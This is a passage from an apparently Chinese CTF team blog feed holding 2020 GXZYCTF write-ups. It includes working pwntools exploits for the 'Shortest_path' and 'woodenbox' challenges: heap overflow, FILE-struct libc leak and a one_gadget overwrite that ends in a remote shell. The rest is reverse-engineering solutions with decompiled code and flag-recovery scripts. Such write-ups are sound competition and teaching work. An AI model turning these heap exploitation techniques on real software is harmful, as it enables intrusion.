class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from Fish import *</span><br><span class="line">#flag&#123;SPFA_1s_4_9o0d_A1gorithm&#125;</span><br><span class="line">get_shell(<span class="string">'Shortest_path:121.37.181.246:19008'</span> , <span class="string">'2.27'</span> , <span class="number">64</span>)#nc <span class="number">121.37</span>.<span class="number">181.246</span> <span class="number">19008</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(SID , SPrice , SName , table):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station Price: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SPrice)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station Name Length: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="built_in">len</span>(SName))</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station Name: \n'</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SName)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Number of connected station: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="built_in">len</span>(table))</span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">        <span class="keyword">ru</span>(<span class="string">'station ID: '</span>)</span><br><span class="line">        <span class="keyword">sl</span>(table[i][<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">ru</span>(<span class="string">'distance: '</span>)</span><br><span class="line">        <span class="keyword">sl</span>(table[i][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">def free(SID):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID)</span><br><span class="line"></span><br><span class="line">def queryStation(SID):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID)</span><br><span class="line"></span><br><span class="line">def queryRoute(SID1 , SID2):</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'options ---&gt; '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Source Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID1)</span><br><span class="line">    <span class="keyword">ru</span>(<span class="string">'Target Station ID: '</span>)</span><br><span class="line">    <span class="keyword">sl</span>(SID2)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0</span>x6068E0</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0</span>,<span class="number">100</span>,<span class="string">'a'</span>*<span class="number">0</span>x20,[(<span class="number">17</span>,<span class="number">2</span>)])</span><br><span class="line"><span class="built_in">add</span>(<span class="number">1</span>,<span class="number">200</span>,<span class="string">'b'</span>*<span class="number">0</span>x20,[(<span class="number">2</span>,-<span class="number">3</span>)])</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">17</span>,<span class="number">10</span>,p64(<span class="number">17</span>)+p64(<span class="number">0</span>x6068e0),[(<span class="number">0</span>,<span class="number">10</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="built_in">add</span>(i , <span class="number">200</span> , <span class="string">'Node'</span> + str(i) , [(i+<span class="number">1</span>,-<span class="number">2</span>)])</span><br><span class="line"><span class="built_in">add</span>(<span class="number">16</span> , <span class="number">600</span> , <span class="string">'Node16'</span> , [(<span class="number">2</span>,-<span class="number">7</span>)])</span><br><span class="line"></span><br><span class="line">queryRoute(<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line">queryStation(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">active()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最短路径算法的题目，&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Libc" scheme="https://boiteam.github.io/categories/Pwn/Libc/"/>
    
    
      <category term="Pwn_reverse" scheme="https://boiteam.github.io/tags/Pwn-reverse/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF woodenbox</title>
    <link href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_woodenbox/"/>
    <id>https://boiteam.github.io/2020/03/21/2020_GXZYCTF_woodenbox/</id>
    <published>2020-03-21T01:52:20.000Z</published>
    <updated>2020-03-22T04:05:03.214Z</updated>
    
    <content type="html"><![CDATA[<p>堆溢出，改下一个heap的size，利用文件结构体泄露libc地址。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">##########################################################################</span><br><span class="line"># File Name: pwn_exp.py</span><br><span class="line"># Author: sofr</span><br><span class="line"># mail: rainb0w<span class="number">.541</span>.bai@gmail.com</span><br><span class="line"># Created Time: Sat Mar  <span class="number">7</span> <span class="number">02</span>:<span class="number">20</span>:<span class="number">54</span> <span class="number">2020</span></span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">s = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sf = lambda x,y:p.sendafter(x,y)</span><br><span class="line">slf = lambda x,y:p.sendlineafter(x,y)</span><br><span class="line">l64_addr = lambda x:u64(x.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">l32_addr = lambda x:u32(x.ljust(<span class="number">0x4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">drop_end = lambda x,y:x.split(y)[<span class="number">0</span>]</span><br><span class="line">getshell = lambda :p.interactive()</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./woodenbox2'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">#libc_name = <span class="string">'./libc6_2.23-0ubuntu11_amd64.so'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">bin = ELF(binary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ShowAddress(s,addr):</span><br><span class="line">    print(<span class="string">'\033[1;31m%s: 0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">def Success(context):</span><br><span class="line">    success(<span class="string">'\033[1;32m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def Error(context):</span><br><span class="line">    warn(<span class="string">'\033[1;31m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    Success(pidof(p))</span><br><span class="line">    raw_input(<span class="string">'\033[1;31mDeBug\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">    slf(<span class="string">"Please enter the length of item name:"</span>,str(size))</span><br><span class="line">    sf(<span class="string">"Please enter the name of item:"</span>,content)</span><br><span class="line"></span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    slf(<span class="string">"Please enter the index of item:"</span>,str(idx))</span><br><span class="line">    slf(<span class="string">"Please enter the length of item name:"</span>,str(size))</span><br><span class="line">    sf(<span class="string">"item:"</span>,content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    slf(<span class="string">"Please enter the index of item:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    global p</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        p=remote(sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    else:</span><br><span class="line">        p=process([binary],env=&#123;<span class="string">'LD_PRELOAD'</span>:libc_name&#125;)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">"b"</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"c"</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">"a"</span>)</span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>))</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">"a"</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="number">0x48</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+<span class="string">"\xdd\x55"</span>)</span><br><span class="line">    #debug()</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"c"</span>)</span><br><span class="line">    fake_file = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"\x28"</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+fake_file)</span><br><span class="line">    recv = ru(<span class="string">'\x7f'</span>)</span><br><span class="line">    print recv</span><br><span class="line">    libc_addr = l64_addr(recv[<span class="number">-6</span>:]) - <span class="number">0x3c5628</span></span><br><span class="line">    ShowAddress(<span class="string">"libc"</span>,libc_addr)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x48</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(libc_addr+<span class="number">0x3c4afd</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"c"</span>)</span><br><span class="line">    one = <span class="number">0x45216</span></span><br><span class="line">    one = <span class="number">0x4526a</span></span><br><span class="line">    one = <span class="number">0xf02a4</span></span><br><span class="line">    #one = <span class="number">0xf1147</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(libc_addr+one))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    debug()</span><br><span class="line">    getshell()</span><br><span class="line">for i <span class="keyword">in</span> xrange(<span class="number">30</span>):</span><br><span class="line">    try:</span><br><span class="line">        global p</span><br><span class="line">        pwn()</span><br><span class="line">        break</span><br><span class="line">    except:</span><br><span class="line">        global p</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;堆溢出，改下一个heap的size，利用文件结构体泄露libc地址。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Libc" scheme="https://boiteam.github.io/categories/Pwn/Libc/"/>
    
    
      <category term="Pwn_file_struct" scheme="https://boiteam.github.io/tags/Pwn-file-struct/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF cyclegraph</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_cyclegraph/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_cyclegraph/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T13:11:32.459Z</updated>
    
    <content type="html"><![CDATA[<p><strong>第一层考点：dump内存</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dword_403370 = 0;</span><br><span class="line">v1 = &amp;unk_403384;</span><br><span class="line">byte_403374 = 48;</span><br><span class="line">v2 = 0;</span><br><span class="line">dword_403378 = (int)&amp;unk_403380;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">  v3 = dword_402178[v2];</span><br><span class="line">  ++v2;</span><br><span class="line">  *(v1 - 1) = v3;</span><br><span class="line">  *v1 = (char *)&amp;unk_403380 + 12 * dword_402274[v2];</span><br><span class="line">  v1[1] = (char *)&amp;unk_403380 + 12 * dword_4021F4[v2];</span><br><span class="line">  v1 += 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在OD中执行完后dump出403348内存的值<br><strong>第二层考点：OD下断</strong><br>核心算法</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">v4 = dword_403370;</span><br><span class="line">v5 = byte_403374;</span><br><span class="line">v6 = 5;</span><br><span class="line">v7 = dword_403378;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">  v11 = *(&amp;v12 + v6);</span><br><span class="line"> <span class="built_in"> if </span>( *(_DWORD *)v7 + v5 == v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(_DWORD *)(v7 + 4);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in"> if </span>( v5 - *(_DWORD *)v7 != v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401020(<span class="string">"This is not flag~\n"</span>, v10);</span><br><span class="line">     <span class="keyword"> system</span>(<span class="string">"pause"</span>);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = *(_DWORD *)(v7 + 8);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(&amp;v12 + v6);</span><br><span class="line">  ++v4;</span><br><span class="line">  ++v6;</span><br><span class="line">  byte_403374 = v5;</span><br><span class="line">  dword_403378 = v7;</span><br><span class="line">  dword_403370 = v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后v7要为0x4034f4。根据dump出的数据在两处if处下断,人工逆运算便可得出flag<br>flag{d8b0bc97a6c0ba27}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;第一层考点：dump内存&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_下断点调试" scheme="https://boiteam.github.io/tags/Re-%E4%B8%8B%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF easyparse</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_easyparse/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_easyparse/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T13:10:50.353Z</updated>
    
    <content type="html"><![CDATA[<p>题目在比赛的时候没做出来，赛后复盘发现硬件断点下错了，梳理逻辑后发现很简单。<br><strong>第一层考点：下准断点</strong><br>这是一个rust编译的程序，因此可读性较差，先找到输出对输出函数下断点<br>_$LT$std..io..stdio..Stdin$u20$as$u20$std..io..Read$GT$::read::h174af29f99bd8aef<br>每次执行这个函数都是从缓冲区读入一个字节，当所有字节都读完之后再一个一个字节验证，很容易联想到pintools爆破求解<br>但稍微耐心点调试发现加密过程很简单<br>密文是程序执行过程中生成的也需要dump<br>解密脚本如下</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = [<span class="number">144</span>, <span class="number">332</span>, <span class="number">28</span>, <span class="number">240</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">240</span>, <span class="number">208</span>, <span class="number">88</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">52</span>, <span class="number">240</span>, <span class="number">276</span>, <span class="number">240</span>, <span class="number">128</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">52</span>, <span class="number">8</span>, <span class="number">240</span>, <span class="number">144</span>, <span class="number">68</span>, <span class="number">48</span>, <span class="number">80</span>, <span class="number">92</span>, <span class="number">44</span>, <span class="number">264</span>, <span class="number">240</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">if</span>((c^<span class="number">0x63</span>)&lt;&lt;(<span class="number">2</span>&amp;<span class="number">0x3f</span>)==i):</span><br><span class="line">flag+=chr(c)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目在比赛的时候没做出来，赛后复盘发现硬件断点下错了，梳理逻辑后发现很简单。&lt;br&gt;&lt;strong&gt;第一层考点：下准断点&lt;/strong&gt;&lt;br&gt;这是一个rust编译的程序，因此可读性较差，先找到输出对输出函数下断点&lt;br&gt;_$LT$std..io..stdio..Stdin$u20$as$u20$std..io..Read$GT$::read::h174af29f99bd8aef&lt;br&gt;每次执行这个函数都是从缓冲区读入一个字节，当所有字节都读完之后再一个一个字节验证，很容易联想到pintools爆破求解&lt;br&gt;但稍微耐心点调试发现加密过程很简单&lt;br&gt;密文是程序执行过程中生成的也需要dump&lt;br&gt;解密脚本如下&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_VM" scheme="https://boiteam.github.io/tags/Re-VM/"/>
    
      <category term="Re_rust编译" scheme="https://boiteam.github.io/tags/Re-rust%E7%BC%96%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF !ftcx</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_fxck!/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_fxck!/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T13:13:29.899Z</updated>
    
    <content type="html"><![CDATA[<p>密文生成和加密运算是两个不同<br>密文是通过一系列加密运算直接生成的，dump出来就能用<br><strong>第一层考点：魔改base58</strong><br>里面稍微加了点混淆，且表也改了，因此不太容易看出这是base58的算法，但有一个显著的特征，他总是在在进行%58操作，因此通过这一特征也可以联想到base58<br>附魔改base58脚本</p><p><img src="/2020/03/20/2020_GXZCTF_fxck!/image-20200321203901085.png" alt="image-20200321203901085"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;密文生成和加密运算是两个不同&lt;br&gt;密文是通过一系列加密运算直接生成的，dump出来就能用&lt;br&gt;&lt;strong&gt;第一层考点：魔改base58&lt;/strong&gt;&lt;br&gt;里面稍微加了点混淆，且表也改了，因此不太容易看出这是base58的算法，但有一个显著的特征，他总是在在进行%58操作，因此通过这一特征也可以联想到base58&lt;br&gt;附魔改base58脚本&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_算法求解" scheme="https://boiteam.github.io/tags/Re-%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF 天津垓</title>
    <link href="https://boiteam.github.io/2020/03/20/2020_GXZCTF_%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
    <id>https://boiteam.github.io/2020/03/20/2020_GXZCTF_%E5%A4%A9%E6%B4%A5%E5%9E%93/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-03-21T13:10:41.274Z</updated>
    
    <content type="html"><![CDATA[<p>有两层加密，第一次的正确作为smc解密的密钥<br><strong>第一层考点：去反调试</strong><br>64位的程序发现有反调试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 sub_10040162B()</span><br><span class="line">&#123;</span><br><span class="line">  _BOOL8 result; <span class="regexp">//</span> rax</span><br><span class="line"></span><br><span class="line">  result = sub_100401195();</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现有反调试直接nop掉<br><strong>第二层考点：算法求解</strong><br>找到关键算法后直接爆破</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char <span class="type">key</span>[] = <span class="string">"Rising_Hopper!"</span>;</span><br><span class="line">int result[] = &#123; <span class="number">17</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">20</span>,<span class="number">42</span>,<span class="number">59</span>,<span class="number">47</span>,<span class="number">3</span>,<span class="number">47</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">72</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">16</span> &#125;;</span><br><span class="line">char flag;</span><br><span class="line">for (int i = <span class="number">0</span>; i &lt;= <span class="number">17</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">for (flag = <span class="number">0x20</span>; flag &lt;= <span class="number">0x7e</span>; flag++)</span><br><span class="line">&#123;</span><br><span class="line">if ((~(flag &amp; <span class="type">key</span>[i % <span class="number">14</span>]) &amp; (flag | <span class="type">key</span>[i % <span class="number">14</span>])) == result[i])</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"%c"</span>,flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Caucasus@s_ability<br><strong>第三层考点：smc</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">lpAddress = a1;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v8 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( strlen(Str) != <span class="number">18</span> )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !VirtualProtect(lpAddress, v7, <span class="number">0</span>x40u, &amp;flOldProtect) )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">    *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % <span class="number">18</span> + v8);</span><br><span class="line">  result = VirtualProtect(lpAddress, v7, flOldProtect, &amp;flOldProtect);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure><p>这是利用第一层密文对代码进行加密，执行完后dump出内存，重新利用IDAf5便可找到关键算法</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span> result[]=&#123;<span class="number">0x1EA272</span>,<span class="number">0x206FC4</span>,<span class="number">0x1D2203</span>,<span class="number">0x1EEF55</span>,<span class="number">0x24F111</span>,<span class="number">0x193A7C</span>,<span class="number">0x1F3C38</span>,<span class="number">0x21566D</span>,<span class="number">0x2323BF</span>,<span class="number">0x2289F9</span>,<span class="number">0x1D2203</span>,<span class="number">0x21098A</span>,<span class="number">0x1E08AC</span>,<span class="number">0x223D16</span>,<span class="number">0x1F891B</span>,<span class="number">0x2370A2</span>,<span class="number">0x1E558F</span>,<span class="number">0x223D16</span>,<span class="number">0x1C883D</span>,<span 